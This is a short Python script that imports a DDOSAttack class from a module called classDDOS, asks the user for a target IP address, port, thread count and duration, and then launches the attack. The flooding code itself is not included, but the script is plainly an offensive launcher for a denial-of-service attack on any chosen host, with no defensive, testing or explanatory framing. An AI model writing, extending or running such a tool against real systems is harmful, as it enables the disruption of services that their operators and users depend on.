from classDDOS import DDOSAttack

if __name__=='__main__': 

    ip=input("IP: ")
    port=input("Port: ")
    num_threads=input("Threads: ")
    duration=input("Duration in seconds: ")

    attack=DDOSAttack(ip,port,num_threads,duration)
    attack.start()